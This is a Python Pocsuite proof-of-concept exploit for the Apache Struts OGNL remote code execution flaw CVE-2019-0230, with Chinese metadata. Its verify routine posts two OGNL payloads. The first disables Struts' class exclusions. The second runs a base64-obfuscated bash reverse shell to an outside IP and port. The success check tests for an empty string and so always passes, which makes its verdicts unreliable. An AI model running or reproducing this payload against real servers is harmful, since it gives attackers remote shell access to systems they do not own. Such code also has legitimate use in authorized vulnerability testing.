#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url

class TestPOC(POCBase):
	vulID = '''CVE-2019-0230'''
	cveID = '''CVE-2019-0230'''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = '''1.0'''
	author = '''侯博文'''
	vulDate = '''2020-08-13'''
	createDate = '''2020-08-13'''
	updateDate = '''2020-08-13'''
	name = '''Apache Struts远程代码执行漏洞'''
	desc = '''2020年08月13日，Apache官方发布了Struts2远程代码执行漏洞的风险通告，该漏洞编号为CVE-2019-0230，漏洞等级：高危，漏洞评分：8.5
	'''
	solution = '''将Apache Struts框架升级至最新版本。'''
	severity = '''高危''' 
	vulType = '''RCE'''
	taskType = ''''''
	references = ['''https://mp.weixin.qq.com/s/sRcP27-y_Ps-YGTZ3Y4uZQ''']
	appName = '''Apache Struts'''
	appVersion = '''Apache Struts 2.0.0 - 2.5.20'''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']

	def _verify(self):
		self.url,ip,port = parse_ip_port(self.target, 80)
		result = {}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
		}
		data1 = {
			"id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
		}
		data2 = {
			"id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjIuMzIuMS85MDE1IDA+JjE=}|{base64,-d}|{bash,-i}'))}"
		}
		vul_url = make_verify_url(self.url, '/', mod=0) #生成完整路径
		resp = req.post(vul_url, data=data1, verify = False, allow_redirects = False, timeout = 10) 
		resp = req.post(vul_url, data=data2, verify = False, allow_redirects = False, timeout = 10) 
		if resp.status_code == 200 and '' in resp.content: #判断条件
			result['VerifyInfo'] = http_packet(resp)
			result['VerifyInfo']['URL'] = vul_url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	def _attack(self):
		return self._verify()

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)